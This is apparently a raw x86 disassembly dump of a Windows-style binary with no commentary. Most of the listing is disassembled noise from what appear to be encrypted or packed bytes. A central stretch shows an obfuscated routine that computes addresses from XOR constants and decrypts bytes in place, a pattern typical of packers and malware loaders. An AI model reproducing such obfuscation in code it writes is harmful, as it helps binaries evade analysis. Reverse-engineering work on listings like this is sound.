  4093ee:	and    BYTE PTR [edx+ecx*2+0x68],ah
  4093f2:	cmp    BYTE PTR [eax+ecx*2],cl
  4093f5:	neg    DWORD PTR [ecx+ebp*8-0x47ffe5de]
  4093fc:	les    ecx,FWORD PTR [eax+0x46]
  4093ff:	test   BYTE PTR [edx-0x10ab84ef],0x6f
  409406:	jl     0x409391
  409408:	jmp    0xaab0397
  40940d:	or     bh,bl
  40940f:	add    BYTE PTR [ebx+0x5ddd6a05],0x50
  409416:	adc    al,0x3a
  409418:	add    DWORD PTR [ebp-0x67],edi
  40941b:	mov    al,0x3d
  40941d:	pusha  
  40941e:	mov    dl,cl
  409420:	xchg   ebx,eax
  409421:	push   ecx
  409422:	and    BYTE PTR [edi+0x3e],bh
  409425:	cmp    eax,0x8013c078
  40942a:	jns    0x409463
  40942c:	push   edi
  40942d:	push   0x4f95d4fc
  409432:	or     al,0xd8
  409434:	idiv   bl
  409436:	jnp    0x409468
  409438:	or     DWORD PTR [eax+edx*2],ebp
  40943b:	sbb    eax,0xef8bc4f7
  409440:	mov    DWORD PTR [ecx-0x14b5eac8],ecx
  409446:	xchg   BYTE PTR [esi],ch
  409448:	aas    
  409449:	stc    
  40944a:	mov    ebx,0x2a7ff61f
  40944f:	inc    edx
  409450:	xor    al,0x6
  409452:	sub    DWORD PTR [ebx-0x1a],0xffffff9a
  409456:	push   cs
  409457:	sub    al,0xa4
  409459:	xchg   ebp,eax
  40945a:	test   BYTE PTR ss:[esi+0x2d],dl
  40945e:	addr16 dec esi
  409460:	xchg   ebx,eax
  409461:	cmp    bh,ch
  409463:	jge    0x40946e
  409465:	or     eax,0x2dcebae5
  40946a:	shl    BYTE PTR [edi+0x12],cl
  40946d:	push   edx
  40946e:	adc    dl,BYTE PTR [edi]
  409470:	pop    esp
  409471:	rol    DWORD PTR [ecx+0x651a664a],0x9
  409478:	pop    ecx
  409479:	adc    DWORD PTR [ecx-0x492e46e8],edi
  40947f:	mov    bh,0xd
  409481:	push   cs
  409482:	data16 jp 0x409469
  409485:	xor    edx,esp
  409487:	(bad)  
  409489:	das    
  40948a:	mov    ds:0xcaf0e8a5,eax
  40948f:	out    dx,al
  409490:	xor    al,0x58
  409492:	inc    esi
  409493:	push   ecx
  409494:	jle    0x4094e9
  409496:	arpl   WORD PTR [esi+eax*2],bx
  409499:	scas   al,BYTE PTR es:[edi]
  40949a:	shr    DWORD PTR [edi],0x35
  40949d:	pop    es
  40949e:	outs   dx,DWORD PTR ds:[esi]
  40949f:	xchg   edi,eax
  4094a0:	ins    DWORD PTR es:[edi],dx
  4094a1:	sub    dl,dh
  4094a3:	jne    0x40946a
  4094a5:	inc    edi
  4094a6:	scas   al,BYTE PTR es:[edi]
  4094a7:	in     al,dx
  4094a8:	aaa    
  4094a9:	ret    0x2ab0
  4094ac:	mov    eax,0x32ecbb03
  4094b1:	in     eax,0x45
  4094b3:	(bad)  
  4094b4:	in     eax,dx
  4094b5:	hlt    
  4094b6:	js     0x409520
  4094b8:	push   ds
  4094b9:	or     BYTE PTR [ecx*8-0x3e3d880f],dl
  4094c0:	jmp    0x4094cc
  4094c2:	xchg   BYTE PTR [ecx+ecx*8],ah
  4094c5:	inc    edi
  4094c6:	xor    BYTE PTR [ebp-0x6f33864f],0x6b
  4094cd:	call   0x8dcdd273
  4094d2:	push   edx
  4094d3:	or     al,0xd
  4094d5:	das    
  4094d6:	imul   esi,DWORD PTR [ebp-0x1357ee85],0xffffffb4
  4094dd:	sub    DWORD PTR [edx],ebp
  4094df:	dec    edi
  4094e0:	xor    ah,BYTE PTR [eax+0x53]
  4094e3:	jne    0x4094ff
  4094e5:	push   ebp
  4094e6:	pop    ebp
  4094e7:	sbb    eax,0x7ffd0d35
  4094ec:	and    esp,DWORD PTR [eax-0x761020d4]
  4094f2:	inc    esp
  4094f3:	scas   al,BYTE PTR es:[edi]
  4094f4:	inc    edi
  4094f5:	push   ds
  4094f6:	ss out dx,al
  4094f8:	inc    ebx
  4094f9:	xchg   esp,eax
  4094fa:	push   ds
  4094fb:	aas    
  4094fc:	sbb    BYTE PTR fs:[edi+0x5f],al
  409500:	or     eax,0x6bc7f238
  409505:	imul   esp,DWORD PTR [ebx],0xfffffff0
  409508:	pop    edi
  409509:	xchg   edi,ecx
  40950b:	loopne 0x409576
  40950d:	(bad)  
  40950e:	sub    ecx,DWORD PTR [esp+esi*1-0xfa73fbc]
  409515:	sub    ebx,DWORD PTR [ecx+0x56]
  409518:	lods   al,BYTE PTR ds:[esi]
  409519:	sub    BYTE PTR [eax+0x649426dc],dl
  40951f:	shl    ecx,cl
  409521:	push   0xffffffb3
  409523:	xor    bh,BYTE PTR [edi]
  409525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409527:	push   es
  409528:	jns    0x409553
  40952a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40952b:	or     DWORD PTR [esi],esi
  40952d:	ins    DWORD PTR es:[edi],dx
  40952e:	add    bh,BYTE PTR [eax-0x5f]
  409531:	cld    
  409532:	addr16 loope 0x409589
  409535:	xchg   ebp,eax
  409536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409537:	sub    BYTE PTR [edx-0x5a],0x91
  40953b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40953c:	mov    eax,ds:0x37108bea
  409541:	js     0x409548
  409543:	push   edx
  409544:	xchg   DWORD PTR [edx-0x30],ecx
  409547:	sub    eax,ebp
  409549:	inc    esp
  40954a:	push   ss
  40954b:	cmc    
  40954c:	jp     0x4095ca
  40954e:	test   al,0x98
  409550:	mov    eax,ds:0x1f0147e6
  409555:	cdq    
  409556:	hlt    
  409557:	jb     0x40956a
  409559:	lods   al,BYTE PTR ds:[esi]
  40955a:	push   edi
  40955b:	aaa    
  40955c:	ins    BYTE PTR es:[edi],dx
  40955d:	loopne 0x409569
  40955f:	xlat   BYTE PTR ds:[ebx]
  409560:	push   0x6305d7ca
  409565:	jp     0x4095ad
  409567:	add    DWORD PTR [esi+0x3f767b5f],edi
  40956d:	(bad)  
  40956e:	mov    edx,0x85c839bc
  409573:	push   0xe
  409575:	(bad)  
  409577:	aad    0x45
  409579:	pop    edx
  40957a:	cmp    esi,DWORD PTR [esi]
  40957c:	push   ecx
  40957d:	adc    al,0xcd
  40957f:	retf   
  409580:	sar    BYTE PTR [ebx-0x759805bd],0x78
  409587:	inc    esp
  409588:	ror    BYTE PTR [esi+0x1c],0xf2
  40958c:	or     eax,0xd28933a
  409591:	jb     0x409563
  409593:	mov    dh,0x10
  409595:	jmp    0x7249:0x6c0711e6
  40959c:	and    eax,0xed9c87c7
  4095a1:	xor    bl,BYTE PTR [esi+0x72b1c2f6]
  4095a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095a8:	mov    esp,0x9896f85a
  4095ad:	ret    
  4095ae:	dec    ebx
  4095af:	sub    BYTE PTR [eax+ebx*2+0x20d39f49],0xac
  4095b7:	int3   
  4095b8:	enter  0x1b0e,0xb8
  4095bc:	mov    ds:0xdef2f415,al
  4095c1:	mov    WORD PTR [edx+0x35cbac40],fs
  4095c7:	mov    ds:0xa58e8b9e,al
  4095cc:	cld    
  4095cd:	pop    esp
  4095ce:	loopne 0x4095d1
  4095d0:	jnp    0x4095e7
  4095d2:	jae    0x409583
  4095d4:	mov    ecx,0x63ac3c63
  4095d9:	jno    0x40962a
  4095db:	jg     0x409647
  4095dd:	(bad)  
  4095de:	ret    
  4095df:	mov    ecx,0x3360b267
  4095e4:	push   ebp
  4095e5:	dec    eax
  4095e6:	in     al,0xca
  4095e8:	sub    eax,0x3f7b1ff2
  4095ed:	(bad)  
  4095ee:	and    DWORD PTR [edi+esi*4],edx
  4095f1:	sub    eax,0xebc3c53b
  4095f6:	xor    ah,BYTE PTR [ebp+0x6afc11b3]
  4095fc:	pop    es
  4095fd:	pop    ds
  4095fe:	add    BYTE PTR [ecx],bl
  409600:	jnp    0x4095f3
  409602:	mov    eax,ds:0x5b0fb318
  409607:	rcr    DWORD PTR [ebp+0x71040fc0],cl
  40960d:	(bad)  
  40960e:	pop    edi
  40960f:	ret    0x8c97
  409612:	call   0x3dd8:0x6d29f91b
  409619:	mov    dh,0xb4
  40961b:	pop    esi
  40961c:	fdiv   QWORD PTR [edi+eax*8-0xf]
  409620:	fistp  WORD PTR [esi+eiz*1-0x538e2810]
  409627:	jo     0x4095f6
  409629:	dec    edi
  40962a:	mov    esp,0xe0c1168b
  40962f:	add    cl,BYTE PTR [ecx+0x568b1055]
  409635:	add    al,0x35
  409637:	jne    0x4095de
  409639:	jns    0x409605
  40963b:	mov    DWORD PTR [ebp+0x14],edx
  40963e:	cmp    eax,DWORD PTR [ebp+0x10]
  409641:	jne    0x4096f4
  409647:	mov    eax,edx
  409649:	cmp    DWORD PTR [ebp+0xc],eax
  40964c:	jne    0x4096f4
  409652:	mov    eax,DWORD PTR [esi]
  409654:	mov    edx,DWORD PTR [esi+0x4]
  409657:	mov    eax,DWORD PTR [esi]
  409659:	mov    edx,DWORD PTR [esi+0x4]
  40965c:	xor    eax,0xca79a577
  409661:	xor    edx,ecx
  409663:	mov    ecx,eax
  409665:	mov    eax,edx
  409667:	shrd   ecx,eax,0x2
  40966b:	shr    eax,0x2
  40966e:	mov    DWORD PTR [ebp+0xc],eax
  409671:	mov    eax,DWORD PTR [esi]
  409673:	mov    edx,DWORD PTR [esi+0x4]
  409676:	mov    edx,eax
  409678:	xor    eax,eax
  40967a:	or     eax,ecx
  40967c:	mov    ecx,DWORD PTR [ebx]
  40967e:	shl    edx,0x1e
  409681:	xor    edx,0x40000000
  409687:	mov    DWORD PTR [ebp+0x10],eax
  40968a:	mov    eax,edx
  40968c:	or     eax,DWORD PTR [ebp+0xc]
  40968f:	mov    edx,DWORD PTR [ebx+0x4]
  409692:	push   eax
  409693:	push   DWORD PTR [ebp+0x10]
  409696:	push   edx
  409697:	push   ecx
  409698:	call   0x416c20
  40969d:	mov    eax,DWORD PTR [esi]
  40969f:	mov    ecx,DWORD PTR [esi+0x4]
  4096a2:	shrd   eax,ecx,0x2
  4096a6:	shr    ecx,0x2
  4096a9:	shr    edx,0x1e
  4096ac:	xor    ecx,0xe706e27a
  4096b2:	push   ecx
  4096b3:	xor    eax,edi
  4096b5:	mov    DWORD PTR [ebp+0x10],edx
  4096b8:	mov    edx,DWORD PTR [ebx]
  4096ba:	mov    edi,DWORD PTR [ebx+0x4]
  4096bd:	push   eax
  4096be:	push   edi
  4096bf:	push   edx
  4096c0:	call   0x416c20
  4096c5:	shld   edx,eax,0x2
  4096c9:	mov    ecx,edx
  4096cb:	xor    edx,edx
  4096cd:	or     ecx,edx
  4096cf:	mov    edx,DWORD PTR [esi]
  4096d1:	mov    edi,DWORD PTR [esi+0x4]
  4096d4:	shl    eax,0x2
  4096d7:	or     eax,DWORD PTR [ebp+0x10]
  4096da:	xor    edi,ecx
  4096dc:	xor    edx,eax
  4096de:	xor    edx,0xca79a575
  4096e4:	xor    edi,0x9c1b89e8
  4096ea:	mov    DWORD PTR [esi],edx
  4096ec:	mov    DWORD PTR [esi+0x4],edi
  4096ef:	jmp    0x40a921
  4096f4:	mov    eax,DWORD PTR [ebp-0x24]
  4096f7:	add    eax,DWORD PTR [ebp-0x4]
  4096fa:	mov    DWORD PTR [ebp-0x28],eax
  4096fd:	mov    eax,DWORD PTR [ebp-0x28]
  409700:	mov    eax,DWORD PTR [ebp-0x4]
  409703:	mov    eax,DWORD PTR [ebp-0x28]
  409706:	mov    eax,DWORD PTR [eax+0xc]
  409709:	mov    edx,DWORD PTR [ebp-0x4]
  40970c:	movzx  eax,WORD PTR [edx+eax*1]
  409710:	cdq    
  409711:	shld   edx,eax,0x2
  409715:	xor    edx,ecx
  409717:	mov    DWORD PTR [ebp+0xc],edx
  40971a:	mov    edx,DWORD PTR [ebp-0x58]
  40971d:	shl    eax,0x2
  409720:	mov    DWORD PTR [ebp+0x10],edx
  409723:	mov    edx,DWORD PTR [ebp-0x54]
  409726:	xor    eax,0xca79a575
  40972b:	mov    DWORD PTR [ebp+0x14],edx
  40972e:	cmp    eax,DWORD PTR [ebp+0x10]
  409731:	jne    0x40a0d1
  409737:	mov    eax,edx
  409739:	cmp    DWORD PTR [ebp+0xc],eax
  40973c:	jne    0x40a0d1
  409742:	mov    DWORD PTR [ebp+0x8],0xca79a575
  409749:	mov    DWORD PTR [ebp+0xc],ecx
  40974c:	mov    DWORD PTR [ebp-0x60],0xca79a571
  409753:	mov    DWORD PTR [ebp-0x5c],ecx
  409756:	mov    DWORD PTR [ebp-0x48],0xca79a57d
  40975d:	mov    DWORD PTR [ebp-0x44],ecx
  409760:	mov    DWORD PTR [ebp-0x38],0xca79a579
  409767:	mov    DWORD PTR [ebp-0x34],ecx
  40976a:	mov    eax,DWORD PTR [ebp+0x8]
  40976d:	mov    ecx,DWORD PTR [ebp+0xc]
  409770:	shrd   eax,ecx,0x2
  409774:	shr    ecx,0x2
  409777:	mov    ecx,DWORD PTR [ebp+0x8]
  40977a:	mov    edx,DWORD PTR [ebp+0xc]
  40977d:	xor    eax,edi
  40977f:	shl    ecx,0x1e
  409782:	xor    edx,edx
  409784:	or     eax,edx
  409786:	add    eax,DWORD PTR ds:0x422588
  40978c:	mov    DWORD PTR [ebp+0x14],eax
  40978f:	mov    eax,DWORD PTR [ebp+0x8]
  409792:	mov    ecx,DWORD PTR [ebp+0xc]
  409795:	shrd   eax,ecx,0x2
  409799:	shr    ecx,0x2
  40979c:	mov    ecx,DWORD PTR [ebp+0x8]
  40979f:	mov    edx,DWORD PTR [ebp+0xc]
  4097a2:	xor    eax,edi
  4097a4:	shl    ecx,0x1e
  4097a7:	xor    edx,edx
  4097a9:	or     eax,edx
  4097ab:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  4097af:	mov    eax,DWORD PTR [ebp+0x14]
  4097b2:	xor    BYTE PTR [eax],cl
  4097b4:	mov    eax,DWORD PTR [ebp-0x60]
  4097b7:	mov    ecx,DWORD PTR [ebp-0x5c]
  4097ba:	shrd   eax,ecx,0x2
  4097be:	shr    ecx,0x2
  4097c1:	mov    ecx,DWORD PTR [ebp-0x60]
  4097c4:	mov    edx,DWORD PTR [ebp-0x5c]
  4097c7:	xor    eax,edi
  4097c9:	shl    ecx,0x1e
  4097cc:	jmp    0x409baa
  4097d1:	or     bh,dh
  4097d3:	cmp    BYTE PTR [esi-0x6574e1dc],dh
  4097d9:	mov    esi,0x4bca5c6
  4097de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097df:	ja     0x40985d
  4097e1:	inc    edi
  4097e2:	inc    ecx
  4097e3:	sbb    BYTE PTR [eax],bl
  4097e5:	sahf   
  4097e6:	adc    bl,BYTE PTR [eax]
  4097e8:	sbb    BYTE PTR [edi],cl
  4097ea:	sub    eax,0x61d5de99
  4097ef:	lock cli 
  4097f1:	mov    dl,0xda
  4097f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097f4:	(bad)  
  4097f5:	loope  0x409862
  4097f7:	inc    edi
  4097f8:	xor    dl,BYTE PTR [esi-0x24293743]
  4097fe:	fsubr  st(7),st
  409800:	or     DWORD PTR [ebp-0x7acfbe1c],ecx
  409806:	push   edi
  409807:	hlt    
  409808:	pop    ebx
  409809:	cmp    al,0xcd
  40980b:	push   edi
  40980c:	lods   al,BYTE PTR ds:[esi]
  40980d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40980e:	add    DWORD PTR [ebp+0xe],edx
  409811:	mov    ch,0xd2
  409813:	aad    0xeb
  409815:	sti    
  409816:	jle    0x409892
  409818:	xor    al,bl
  40981a:	push   0xaf8cd9d9
  40981f:	sti    
  409820:	retf   
  409821:	fwait
  409822:	mov    edx,0x9e3ab168
  409827:	pop    ds
  409828:	inc    ebp
  409829:	jg     0x4097e4
  40982b:	mov    ebx,0xbcad2d8a
  409830:	inc    edi
  409831:	stos   BYTE PTR es:[edi],al
  409832:	mov    ch,dl
  409834:	jmp    0x6ea7ea3a
  409839:	sub    cl,dh
  40983b:	pop    esi
  40983c:	xchg   ebp,eax
  40983d:	das    
  40983e:	inc    ebp
  40983f:	call   0x6760:0xd8bd4e4b
  409846:	or     dh,BYTE PTR [eax]
  409848:	mov    ebp,0x564b434
  40984d:	jnp    0x4097f8
  40984f:	or     eax,0x7761111d
  409854:	int    0x18
  409856:	test   ebx,edi
  409858:	repnz aaa 
  40985a:	jb     0x40988a
  40985c:	(bad)  [eax+0x5150eefa]
  409862:	(bad)  
  409863:	sub    BYTE PTR [edx],cl
  409865:	cld    
  409866:	int    0x34
  409868:	push   ss
  409869:	sbb    ebp,DWORD PTR [edx]
  40986b:	xchg   BYTE PTR [esi+eiz*2],dl
  40986e:	jp     0x40982d
  409870:	jmp    DWORD PTR [eax+0x3a]
  409873:	mov    DWORD PTR [esp+ecx*4-0x12e4258e],0xd68e0ac4
  40987e:	push   ecx
  40987f:	aaa    
  409880:	and    bh,BYTE PTR [ebx]
  409882:	in     al,0x8e
  409884:	push   cs
  409885:	push   0xbef6db2c
  40988a:	repnz cli 
  40988c:	mov    edx,0x4bda75a3
  409891:	jmp    0x9db5e590
  409896:	add    eax,0x1ef946b6
  40989b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40989c:	in     eax,dx
  40989d:	push   ss
  40989e:	jge    0x409844
  4098a0:	int    0x27
  4098a2:	ja     0x40987e
  4098a4:	xor    eax,0xe44c5d21
  4098a9:	sub    ch,dh
  4098ab:	jmp    0xae30:0x2e16b733
  4098b2:	mov    ebx,0x96789c76
  4098b7:	std    
  4098b8:	outs   dx,BYTE PTR ds:[esi]
  4098b9:	sub    dh,dh
  4098bb:	inc    ebx
  4098bc:	jmp    0xbd6061e8
  4098c1:	les    edi,FWORD PTR [ecx-0x1e]
  4098c4:	mov    dl,0xc2
  4098c6:	pop    es
  4098c7:	adc    BYTE PTR [esi-0x7fc2a53c],dh
  4098cd:	in     al,dx
  4098ce:	fcomi  st,st(3)
  4098d0:	mov    ebp,ebp
  4098d2:	aad    0xe6
  4098d4:	mov    edi,0x6dcdb2a
  4098d9:	mov    ds,WORD PTR [esi+0x59]
  4098dc:	int3   
  4098dd:	xchg   esi,eax
  4098de:	mov    cl,0x2c
  4098e0:	(bad)  
  4098e1:	fs mov cs,edx
  4098e4:	push   eax
  4098e5:	xchg   ecx,eax
  4098e6:	pop    es
  4098e7:	test   BYTE PTR [ebx+edi*1-0x47f38eaf],bl
  4098ee:	clc    
  4098ef:	enter  0x54ba,0xdf
  4098f3:	dec    esi
  4098f4:	sbb    eax,esi
  4098f6:	popa   
  4098f7:	mov    ah,0xe2
  4098f9:	cmp    eax,DWORD PTR [ecx-0x34]
  4098fc:	and    ebp,DWORD PTR [esi]
  4098fe:	sub    edi,DWORD PTR [eax]
  409900:	out    0xd6,al
  409902:	int    0xbe
  409904:	inc    esi
  409905:	push   edx
  409906:	(bad)  
  409908:	fidivr DWORD PTR [ecx]
  40990a:	jne    0x409983
  40990c:	pop    esi
  40990d:	lahf   
  40990e:	jmp    0x280e0fd5
  409913:	cs dec ebx
  409915:	pop    edx
  409916:	adc    esp,ebp
  409918:	sub    eax,0x225bd9cb
  40991d:	jnp    0x40992b
  40991f:	cmp    ecx,esi
  409921:	sbb    dh,BYTE PTR [edi-0x33c74ae3]
  409927:	push   es
  409928:	push   ss
  409929:	jecxz  0x409987
  40992b:	std    
  40992c:	repz fwait
  40992e:	xchg   ebx,eax
  40992f:	push   0x9866bffc
  409934:	push   ecx
  409935:	pop    ebp
  409936:	pusha  
  409937:	sahf   
  409938:	inc    edx
  409939:	pusha  
  40993a:	pop    ds
  40993b:	out    dx,eax
  40993c:	ror    BYTE PTR [ebp-0x6364a043],0x13
  409943:	repnz jecxz 0x4099bd
  409946:	push   0xffffffc6
  409948:	int    0x9b
  40994a:	mov    esi,0xdb04ae89
  40994f:	jo     0x4098ee
  409951:	invlpg BYTE PTR [edi+0x7f]
  409955:	inc    esp
  409956:	arpl   WORD PTR [ebp+0x2a6afadf],cx
  40995c:	les    eax,FWORD PTR [ebp-0xe]
  40995f:	not    BYTE PTR [ebx-0x7]
  409962:	jg     0x4098f0
  409964:	outs   dx,BYTE PTR ds:[esi]
  409965:	mov    bl,0x13
  409967:	pop    esp
  409968:	(bad)  
  409969:	out    0x36,eax
  40996b:	bound  ebx,QWORD PTR [edx]
  40996d:	mov    esp,0x2fcb9fec
  409972:	aaa    
  409973:	call   0x3a86db48
  409978:	(bad)  
  409979:	push   cs
  40997a:	cdq    
  40997b:	add    eax,0x5f828628
  409980:	xchg   ebp,eax
  409981:	dec    DWORD PTR [ecx-0x1eb4fea4]
  409987:	nop
  409988:	out    0x23,al
  40998a:	arpl   WORD PTR [eax+0x6b835481],sp
  409990:	dec    edi
  409991:	pusha  
  409992:	mov    esi,eax
  409994:	imul   BYTE PTR [ecx+0x5e]
  409997:	cmc    
  409998:	push   ebp
  409999:	pop    ds
  40999a:	cs cli 
  40999c:	fwait
  40999d:	jae    0x40993f
  40999f:	sub    BYTE PTR [ebx+edx*2+0x12],0x72
  4099a4:	push   0x628f4459
  4099a9:	xchg   ebx,eax
  4099aa:	inc    DWORD PTR [ebp+0x65]
  4099ad:	lock sub WORD PTR [esi+ebx*2-0x74],ax
  4099b3:	out    dx,al
  4099b4:	xchg   cl,bh
  4099b6:	sbb    eax,0x8d20f295
  4099bb:	mov    edx,0x44a9265d
  4099c0:	xchg   ebp,eax
  4099c1:	or     al,0x23
  4099c3:	ss scas eax,DWORD PTR es:[edi]
  4099c5:	jecxz  0x409a1e
  4099c7:	scas   al,BYTE PTR es:[edi]
  4099c8:	ja     0x4099ce
  4099ca:	into   
  4099cb:	and    BYTE PTR [eax+0x5970a036],ah
  4099d1:	jecxz  0x4099ac
  4099d3:	jecxz  0x409955
  4099d5:	les    ebx,FWORD PTR [edx]
  4099d7:	sub    DWORD PTR ds:0xcf2760a6,ebx
  4099dd:	xor    BYTE PTR [esi],bl
  4099df:	repz jbe 0x4099df
  4099e2:	mov    esi,0x35ad876
  4099e7:	mov    bl,0x9f
  4099e9:	fnstcw WORD PTR [ebp-0x5063cb52]
  4099ef:	xor    BYTE PTR [edx-0x2cd29805],dh
  4099f5:	pop    ss
  4099f6:	int3   
  4099f7:	pop    esp
  4099f8:	out    dx,al
  4099f9:	or     BYTE PTR [edi],bh
  4099fb:	and    eax,0x698dcd5b
  409a00:	pushf  
  409a01:	push   ecx
  409a02:	jmp    0x409a83
  409a04:	and    DWORD PTR [ebx+0xa],ebp
  409a07:	inc    ecx
  409a08:	xlat   BYTE PTR ds:[ebx]
  409a09:	call   0xfbbf:0x4d7d9528
  409a10:	pop    edi
  409a11:	add    BYTE PTR [edi-0x7b9b34df],bh
  409a17:	sub    esp,DWORD PTR [eax]
  409a19:	dec    eax
  409a1a:	pop    ebx
  409a1b:	adc    eax,0xd629b7
  409a20:	push   ebx
  409a21:	push   ds
  409a22:	cmp    al,0xeb
  409a24:	es hlt 
  409a26:	int3   
  409a27:	xlat   BYTE PTR ds:[ebx]
  409a28:	repnz mov esi,0xbc3fd5b0
  409a2e:	jnp    0x4099d7
  409a30:	xchg   esi,eax
  409a31:	in     eax,0x66
  409a33:	mov    esi,0xd932eafe
  409a38:	nop
  409a39:	int    0xd8
  409a3b:	test   eax,esi
  409a3d:	mov    eax,ds:0xb8e07da6
  409a42:	lods   eax,DWORD PTR ds:[esi]
  409a43:	into   
  409a44:	cmp    eax,0x254998d4
  409a49:	popa   
  409a4a:	hlt    
  409a4b:	mov    gs,edx
  409a4d:	(bad)  
  409a4e:	pop    ds
  409a4f:	clc    
  409a50:	inc    ebp
  409a51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a52:	and    DWORD PTR [ecx+0x3f],0xe9189f51
  409a59:	xchg   BYTE PTR [esi],bh
  409a5b:	jle    0x409ac1
  409a5d:	repz test DWORD PTR [ecx+0x3b],esp
  409a61:	mov    ds:0xb2ca22c2,eax
  409a66:	mov    ebx,0xec872d65
  409a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a6c:	es inc esi
  409a6e:	adc    bh,bl
  409a70:	sub    bl,BYTE PTR ds:0x54d79352
  409a76:	pop    ecx
  409a77:	and    eax,0xca33d708
  409a7c:	addr16 sub esi,ecx
  409a7f:	mov    esi,ebp
  409a81:	and    DWORD PTR [ebp-0x13],eax
  409a84:	out    dx,eax
  409a85:	dec    ebp
  409a86:	mov    esp,0xc0245731
  409a8b:	mov    al,0x84
  409a8d:	jp     0x409a7a
  409a8f:	xchg   edi,eax
  409a90:	mov    ecx,0xaf34329d
  409a95:	ret    
  409a96:	popf   
  409a97:	in     al,dx
  409a98:	addr16 mov al,ds:0xde9
  409a9c:	stos   BYTE PTR es:[edi],al
  409a9d:	in     eax,0xab
  409a9f:	jb     0x409b03
  409aa1:	shl    DWORD PTR [esi-0x23],1
  409aa4:	push   ss
  409aa5:	call   0x706a8046
  409aaa:	jmp    0x409a30
  409aac:	scas   al,BYTE PTR es:[edi]
  409aad:	lea    ebx,[edi-0x1]
  409ab0:	out    0xb5,eax
  409ab2:	cdq    
  409ab3:	out    0x5f,eax
  409ab5:	(bad)  
  409ab6:	ins    BYTE PTR es:[edi],dx
  409ab7:	mov    ah,0xe2
  409ab9:	pop    eax
  409aba:	aam    0xbd
  409abc:	rcr    DWORD PTR [ecx-0x4d],1
  409abf:	pushf  
  409ac0:	or     eax,0x6b18c9f3
  409ac5:	(bad)  
  409ac6:	sar    bl,1
  409ac8:	(bad)  
  409ac9:	stos   DWORD PTR es:[edi],eax
  409aca:	pop    edx
  409acb:	fisub  DWORD PTR ds:0xef6c6075
  409ad1:	mov    ds:0x28757728,eax
  409ad6:	mov    ch,0x57
  409ad8:	xchg   ebx,eax
  409ad9:	jmp    0x46553992
  409ade:	jo     0x409ad9
  409ae0:	jp     0x409ac4
  409ae2:	mov    cl,BYTE PTR [edi+edi*8]
  409ae5:	arpl   WORD PTR [edx-0x4c],sp
  409ae8:	fisttp QWORD PTR [ecx]
  409aea:	cli    
  409aeb:	xor    DWORD PTR [ebp-0x4b],eax
  409aee:	jmp    0x8154545f
  409af3:	jp     0x409a88
  409af5:	xor    DWORD PTR [edi],0xffffffd3
  409af8:	mov    ds:0x32541fdd,eax
  409afd:	ds push es
  409aff:	dec    ebx
  409b00:	and    bl,BYTE PTR [eax+0x6a]
  409b03:	xchg   edi,eax
  409b04:	push   eax
  409b05:	lods   eax,DWORD PTR ds:[esi]
  409b06:	in     al,dx
  409b07:	cmp    eax,0xccf2dcf9
  409b0c:	fidivr WORD PTR [eax]
  409b0e:	in     eax,0x1e
  409b10:	pop    ss
  409b11:	fld    QWORD PTR [edx]
  409b13:	inc    edi
  409b14:	leave  
  409b15:	out    0xe6,eax
  409b17:	jp     0x409aa7
  409b19:	adc    eax,0x149a7960
  409b1e:	xor    BYTE PTR [eax],0x5a
  409b21:	jne    0x409afe
  409b23:	(bad)  
  409b24:	aaa    
  409b25:	fprem  
  409b27:	inc    edx
  409b28:	dec    edx
  409b29:	hlt    
  409b2a:	cs scas eax,DWORD PTR es:[edi]
  409b2c:	out    0x58,al
  409b2e:	inc    ebx
  409b2f:	add    al,0x41
  409b31:	jnp    0x409ae8
  409b33:	test   al,0x8b
  409b35:	rol    BYTE PTR [ebp+0x2f],cl
  409b38:	lock iret 
  409b3a:	(bad)  
  409b3b:	sahf   
  409b3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b3d:	push   0x382549c6
  409b42:	dec    esp
  409b43:	push   ebx
  409b44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b45:	ds clc 
  409b47:	jno    0x409b9c
  409b49:	fwait
  409b4a:	adc    ebx,DWORD PTR [edx+esi*2]
  409b4d:	in     al,dx
  409b4e:	in     al,0x98
  409b50:	jecxz  0x409b69
  409b52:	mov    edi,DWORD PTR [edi]
  409b54:	scas   al,BYTE PTR es:[edi]
  409b55:	inc    esi
  409b56:	xchg   ebx,eax
  409b57:	mov    cl,0x3c
  409b59:	sub    eax,0xb1e4969a
  409b5e:	cmp    eax,0xa24eebff
  409b63:	(bad)  
  409b65:	adc    eax,DWORD PTR [ebp-0x33c912c0]
  409b6b:	xor    dl,cl
  409b6d:	dec    esi
  409b6e:	into   
  409b6f:	or     bh,BYTE PTR [ecx+esi*8]
  409b72:	mov    ds:0x5c28f81d,al
  409b77:	adc    BYTE PTR [edi+0x1e48fd8],al
  409b7d:	xchg   edx,eax
  409b7e:	sub    eax,DWORD PTR [edx-0x6f]
  409b81:	repnz jecxz 0x409b39
  409b84:	pop    esp
  409b85:	or     al,0xf
  409b87:	pop    edi
  409b88:	xchg   BYTE PTR [ecx+0x1e],ah
  409b8b:	aad    0xdb
  409b8d:	sbb    eax,0x4daeec0c
  409b92:	mov    ah,ah
  409b94:	ret    
  409b95:	bnd ret 0x69d4
  409b99:	repnz add eax,0xfa9eb89d
  409b9f:	xchg   esp,eax
  409ba0:	sbb    eax,0xc0e18b1a
  409ba5:	popf   
  409ba6:	sar    DWORD PTR [ebx+0x3e],cl
  409ba9:	std    
  409baa:	xor    edx,edx
  409bac:	or     eax,edx
  409bae:	add    eax,DWORD PTR ds:0x422588
  409bb4:	mov    DWORD PTR [ebp+0x14],eax
  409bb7:	mov    eax,DWORD PTR [ebp-0x60]
  409bba:	mov    ecx,DWORD PTR [ebp-0x5c]
  409bbd:	shrd   eax,ecx,0x2
  409bc1:	shr    ecx,0x2
  409bc4:	mov    ecx,DWORD PTR [ebp-0x60]
